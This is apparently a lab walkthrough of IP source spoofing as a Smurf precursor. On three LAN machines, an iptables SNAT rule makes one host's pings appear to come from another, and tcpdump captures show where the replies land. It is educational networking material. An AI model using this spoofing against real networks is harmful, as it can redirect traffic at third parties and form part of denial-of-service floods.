# IP Spoofing / Smurf

First a basic local sample with three computers, this will not work outside a LAN.

## Test

**Target 1 (192.168.0.127)**
Enable TCP Dump and filter for ICMP only

```shell
jeff@test:~$ sudo tcpdump -n icmp
[sudo] password for jeff:
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on ens33, link-type EN10MB (Ethernet), capture size 262144 bytes
```

**Attacker (192.168.0.114)**
Submit a regular ping request

```shell
jeff@chickendinner:~$ ping -c 3 192.168.0.127
PING 192.168.0.127 (192.168.0.127) 56(84) bytes of data.
64 bytes from 192.168.0.127: icmp_seq=1 ttl=64 time=0.635 ms
64 bytes from 192.168.0.127: icmp_seq=2 ttl=64 time=1.28 ms
64 bytes from 192.168.0.127: icmp_seq=3 ttl=64 time=3.02 ms

--- 192.168.0.127 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2035ms
rtt min/avg/max/mdev = 0.635/1.644/3.023/1.009 ms
```

**Target 1 (192.168.0.127)**
View the results

*Note that the source IP on target 1 is 192.168.0.114.*

```bash
09:16:41.805891 IP 192.168.0.114 > 192.168.0.127: ICMP echo request, id 1830, seq 1, length 64
09:16:41.806083 IP 192.168.0.127 > 192.168.0.114: ICMP echo reply, id 1830, seq 1, length 64
09:16:42.816794 IP 192.168.0.114 > 192.168.0.127: ICMP echo request, id 1830, seq 2, length 64
09:16:42.817139 IP 192.168.0.127 > 192.168.0.114: ICMP echo reply, id 1830, seq 2, length 64
09:16:43.842315 IP 192.168.0.114 > 192.168.0.127: ICMP echo request, id 1830, seq 3, length 64
09:16:43.843212 IP 192.168.0.127 > 192.168.0.114: ICMP echo reply, id 1830, seq 3, length 64
09:16:51.549534 IP 192.168.0.114 > 192.168.0.127: ICMP echo request, id 1831, seq 1, length 64
09:16:51.549916 IP 192.168.0.127 > 192.168.0.114: ICMP echo reply, id 1831, seq 1, length 64
09:16:52.582380 IP 192.168.0.114 > 192.168.0.127: ICMP echo request, id 1831, seq 2, length 64
09:16:52.583100 IP 192.168.0.127 > 192.168.0.114: ICMP echo reply, id 1831, seq 2, length 64
09:16:53.585682 IP 192.168.0.114 > 192.168.0.127: ICMP echo request, id 1831, seq 3, length 64
09:16:53.588119 IP 192.168.0.127 > 192.168.0.114: ICMP echo reply, id 1831, seq 3, length 64
```

## Setup

**Target 1 (192.168.0.127)**
Enable TCP Dump and filter for ICMP only

```shell
jeff@test:~$ sudo tcpdump -n icmp
[sudo] password for jeff:
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on ens33, link-type EN10MB (Ethernet), capture size 262144 bytes
```

**Target 2 (192.168.0.113)**
Enable TCP Dump and filter for ICMP only

```shell
~ Â» sudo tcpdump -n icmp
Password:
tcpdump: data link type PKTAP
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on pktap, link-type PKTAP (Apple DLT_PKTAP), capture size 262144 bytes
```

**Attacker (192.168.0.114)**
Configure IPTables to spoof our outbound IP and fire an attack to target 1

```bash
jeff@chickendinner:~$ sudo iptables -t nat -A POSTROUTING -j SNAT --to-source 192.168.0.113
```

## Attack

### Attacker (192.168.0.114)

Fire the attack to target 1.

*Notice that these timeout, this is because the replies are going to 192.168.0.113.*

```bash
jeff@chickendinner:~$ ping -c 3 192.168.0.127
PING 192.168.0.127 (192.168.0.127) 56(84) bytes of data.

--- 192.168.0.127 ping statistics ---
3 packets transmitted, 0 received, 100% packet loss, time 2054ms
```

### Target 1 (192.168.0.127)

Notice that the source IP is actually 192.168.0.113 despite being sent from 192.168.0.114

```bash
09:28:21.631443 IP 192.168.0.113 > 192.168.0.127: ICMP echo request, id 1831, seq 1, length 64
09:28:21.631784 IP 192.168.0.127 > 192.168.0.113: ICMP echo reply, id 1831, seq 1, length 64
09:28:22.663462 IP 192.168.0.113 > 192.168.0.127: ICMP echo request, id 1831, seq 2, length 64
09:28:22.664177 IP 192.168.0.127 > 192.168.0.113: ICMP echo reply, id 1831, seq 2, length 64
09:28:23.686600 IP 192.168.0.113 > 192.168.0.127: ICMP echo request, id 1831, seq 3, length 64
09:28:23.687266 IP 192.168.0.127 > 192.168.0.113: ICMP echo reply, id 1831, seq 3, length 64
09:28:27.835766 IP 192.168.0.1 > 192.168.0.113: ICMP time exceeded in-transit, length 72
```

### Target 2 (192.168.0.113)

On this machine, despite not being pinged, is receiving the responses from the ICMP request

```bash
09:37:01.890172 IP 192.168.0.113 > 192.168.0.127: ICMP echo request, id 1848, seq 1, length 64
09:37:02.918956 IP 192.168.0.113 > 192.168.0.127: ICMP echo request, id 1848, seq 2, length 64
09:37:03.941852 IP 192.168.0.113 > 192.168.0.127: ICMP echo request, id 1848, seq 3, length 64
```